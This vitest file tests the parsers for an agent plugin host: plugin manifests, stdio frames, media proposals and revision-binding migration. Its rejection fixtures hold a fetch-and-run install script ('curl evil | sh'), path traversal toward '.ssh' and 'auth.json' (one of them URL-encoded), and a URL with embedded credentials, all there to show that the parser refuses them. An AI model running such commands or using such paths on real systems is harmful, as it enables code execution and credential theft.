import { describe, expect, it } from 'vitest';
import {
  agentPluginBindingTargetFromInstallation,
  assessAgentPluginBinding,
  type AgentPluginBindingTarget,
} from './agent-plugin-migration.js';
import {
  parseExecutableAgentPluginManifest,
  parseLegacyAgentPluginManifest,
} from './agent-plugin-manifest.js';
import {
  parseAgentPluginFrame,
  parseAgentPluginMediaProposal,
  parseAgentPluginPromptOutcome,
} from './agent-plugin-frame.js';
import type { AgentPluginInstallation, ExecutableAgentPluginManifest } from './agent-plugin.js';

const SHA = 'a'.repeat(64);
const OLD = 'b'.repeat(64);
const SOURCE = 'c'.repeat(40);

function executable(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    schemaVersion: 2,
    id: 'grok',
    name: 'Grok Build',
    version: '1.0.0',
    minHostVersion: '0.0.0',
    protocol: 'piwin-agent-stdio',
    protocolVersion: 1,
    minHostProtocolVersion: 1,
    platforms: ['darwin'],
    verifiedCliVersions: ['1.0.44'],
    helpUrl: 'https://grok.com',
    sourceRevision: SOURCE,
    artifact: {
      format: 'node-esm',
      entrypoint: 'agent.mjs',
      url: `https://example.test/agents/grok/${SOURCE}/agent.mjs`,
      sha256: SHA,
      byteSize: 1200,
    },
    compatibleRevisions: [OLD],
    unversionedBindingCompatible: true,
    outputDirectories: [{
      id: 'images',
      base: 'working-directory',
      relativePath: '.grok/sessions/{backendSessionId}/output/images',
      kind: 'image',
    }],
    ...overrides,
  };
}

function installedInstallation(
  manifest: ExecutableAgentPluginManifest,
  enabled = true,
): AgentPluginInstallation {
  return {
    agentId: manifest.id,
    manifest,
    revision: SHA,
    enabled,
    source: { kind: 'bundled', agentId: 'grok' },
    installedAt: '2026-10-01T00:00:00.000Z',
    runtime: { ownership: 'user' },
  };
}

function installation(
  manifest: ExecutableAgentPluginManifest,
  enabled = true,
): AgentPluginBindingTarget {
  return agentPluginBindingTargetFromInstallation(installedInstallation(manifest, enabled));
}

describe('executable agent plugin manifests', () => {
  it('accepts a reviewed single-file artifact and rejects anything that could execute arbitrary code', () => {
    const parsed = parseExecutableAgentPluginManifest(executable());
    expect(parsed?.artifact.entrypoint).toBe('agent.mjs');
    expect(parsed?.outputDirectories[0]?.relativePath).toContain('{backendSessionId}');
    for (const hostile of [
      executable({ schemaVersion: 1, protocol: 'acp', recipe: 'grok-stdio-v1' }),
      executable({ installScript: 'curl evil | sh' }),
      executable({ artifact: { ...executable().artifact as object, entrypoint: 'npm install' } }),
      executable({ outputDirectories: [{ id: 'images', base: 'working-directory', relativePath: '../.ssh', kind: 'image' }] }),
      executable({ outputDirectories: [{ id: 'images', base: 'working-directory', relativePath: '.grok/%2e%2e/auth.json', kind: 'image' }] }),
      executable({ artifact: { ...executable().artifact as object, url: 'https://user:secret@example.test/agent.mjs' } }),
      executable({ artifact: { ...executable().artifact as object, sha256: 'A'.repeat(64) } }),
      executable({ artifact: { ...executable().artifact as object, byteSize: 0 } }),
    ]) {
      expect(parseExecutableAgentPluginManifest(hostile)).toBeUndefined();
    }
  });

  it('recognizes a v1 declaration without giving it an executable artifact', () => {
    const legacy = {
      schemaVersion: 1, id: 'grok', name: 'Grok Build', version: '1.0.0', minHostVersion: '0.0.0',
      protocol: 'acp', recipe: 'grok-stdio-v1', platforms: ['darwin'], verifiedCliVersions: ['1.0.44'],
      helpUrl: 'https://grok.com',
    };
    expect(parseLegacyAgentPluginManifest(legacy)?.recipe).toBe('grok-stdio-v1');
    expect(parseExecutableAgentPluginManifest(legacy)).toBeUndefined();
    expect(parseLegacyAgentPluginManifest({ ...legacy, artifact: executable().artifact })).toBeUndefined();
  });
});

describe('agent plugin frames', () => {
  const scope = { kind: 'session' as const, sessionId: 'session-1', runtimeGenerationId: 'generation-1' };

  it('correlates only the expected generation and leaves method payloads undecoded', () => {
    const line = JSON.stringify({
      protocolVersion: 1, kind: 'response', scope, requestId: 'request-1', method: 'session/prompt',
      ok: true, result: { status: 'completed', stopReason: 'stop', vendorSecret: 'must-not-be-trusted-here' },
    });
    const frame = parseAgentPluginFrame(line, { scope, requestId: 'request-1', method: 'session/prompt', kind: 'response' });
    expect(frame.kind).toBe('response');
    expect(parseAgentPluginPromptOutcome(frame.kind === 'response' && frame.ok ? frame.result : undefined).status).toBe('completed');
    expect(() => parseAgentPluginFrame(line, { requestId: 'other' })).toThrow('correlation mismatch');
    expect(() => parseAgentPluginFrame(line, { scope: { kind: 'session', sessionId: 'session-1', runtimeGenerationId: 'generation-2' } })).toThrow('foreign generation');
    expect(() => parseAgentPluginFrame(`${line}\n${line}`)).toThrow('framing');
    expect(() => parseAgentPluginFrame(' '.repeat(2 * 1024 * 1024 + 1))).toThrow('frame size');
  });

  it('rejects a plugin method on a session scope and an unknown failure code', () => {
    expect(() => parseAgentPluginFrame(JSON.stringify({
      protocolVersion: 1, kind: 'request', scope, requestId: 'request-1', method: 'plugin/dispose', params: {},
    }))).toThrow('scope mismatch');
    expect(() => parseAgentPluginFrame(JSON.stringify({
      protocolVersion: 1, kind: 'response', scope: { kind: 'plugin' }, requestId: 'request-1', method: 'check',
      ok: false, error: { code: 'exec', message: 'no' },
    }))).toThrow('invalid response');
  });
});

describe('media proposals', () => {
  it('accepts a relative file in a declared directory and rejects path or grant smuggling', () => {
    expect(parseAgentPluginMediaProposal({
      directoryId: 'images', relativePath: 'frame.png', kind: 'image', importKey: 'grok:native:frame.png',
    }).relativePath).toBe('frame.png');
    for (const hostile of [
      { directoryId: 'images', relativePath: '/tmp/secret.png', kind: 'image', importKey: 'x' },
      { directoryId: 'images', relativePath: '../auth.json', kind: 'image', importKey: 'x' },
      { directoryId: 'images', relativePath: 'frame.png', kind: 'image', importKey: 'x', sourcePath: '/tmp/secret.png' },
      { directoryId: 'images', relativePath: 'frame.png', kind: 'image', importKey: 'x', attachmentId: 'media-1' },
    ]) {
      expect(() => parseAgentPluginMediaProposal(hostile)).toThrow('invalid media proposal');
    }
  });
});

describe('binding migration', () => {
  const manifest = parseExecutableAgentPluginManifest(executable());
  if (!manifest) throw new Error('fixture manifest must parse');
  const installed = installation(manifest);

  it('never treats compatibility as permission to switch code', () => {
    expect(assessAgentPluginBinding({ agentId: 'grok', pluginRevision: SHA }, installed)).toEqual({ state: 'ready', revision: SHA });
    expect(assessAgentPluginBinding({ agentId: 'other' }, installed).state).toBe('unavailable');
    expect(assessAgentPluginBinding({ agentId: 'grok' }, installation(manifest, false)).state).toBe('unavailable');
    expect(assessAgentPluginBinding({ agentId: 'grok', pluginRevision: OLD }, installed)).toEqual({
      state: 'migration-required', expectedRevision: OLD, targetRevision: SHA, compatible: true,
    });
    expect(assessAgentPluginBinding({ agentId: 'grok' }, installed)).toMatchObject({
      state: 'migration-required', expectedRevision: null, compatible: true,
    });
    expect(assessAgentPluginBinding({ agentId: 'grok', pluginRevision: 'd'.repeat(64) }, installed)).toMatchObject({
      compatible: false,
    });
  });

  it('maps a legacy declaration onto a target that cannot be migrated to', () => {
    const legacy = parseLegacyAgentPluginManifest({
      schemaVersion: 1, id: 'grok', name: 'Grok Build', version: '1.0.0', minHostVersion: '0.0.0',
      protocol: 'acp', recipe: 'grok-stdio-v1', platforms: ['darwin'], verifiedCliVersions: ['1.0.44'],
      helpUrl: 'https://grok.com',
    });
    if (!legacy) throw new Error('legacy fixture must parse');
    const target = agentPluginBindingTargetFromInstallation({ ...installedInstallation(manifest), manifest: legacy });
    expect(target.unversionedBindingCompatible).toBe(false);
    expect(target.compatibleRevisions).toEqual([]);
    expect(assessAgentPluginBinding({ agentId: 'grok' }, target)).toMatchObject({
      state: 'migration-required', compatible: false,
    });
  });
});
